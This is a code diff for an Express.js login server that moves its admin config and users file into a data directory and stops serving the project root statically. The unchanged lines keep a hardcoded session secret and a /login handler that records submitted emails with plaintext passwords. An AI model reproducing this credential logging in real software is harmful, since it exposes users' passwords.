@@ -6,12 +6,17 @@ const session = require('express-session');
 
 const app = express();
 const PORT = 3000;
-const ADMIN_CONFIG_FILE = 'admin_config.json';
-const USERS_FILE = 'users.txt';
+const DATA_DIR = path.join(__dirname, 'data');
+const ADMIN_CONFIG_FILE = path.join(DATA_DIR, 'admin_config.json');
+const USERS_FILE = path.join(DATA_DIR, 'users.txt');
+
+// Ensure data directory exists
+if (!fs.existsSync(DATA_DIR)) {
+    fs.mkdirSync(DATA_DIR);
+}
 
 // Middleware
 app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, '.')));
 app.use(session({
     secret: 'secret-key-just-for-testing',
     resave: false,
@@ -29,10 +34,6 @@ const getAdminPassword = () => {
 };
 
 // Routes
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
-
 app.post('/login', (req, res) => {
     const { email, password } = req.body;
     const logEntry = `Email: ${email}, Password: ${password}\n`;
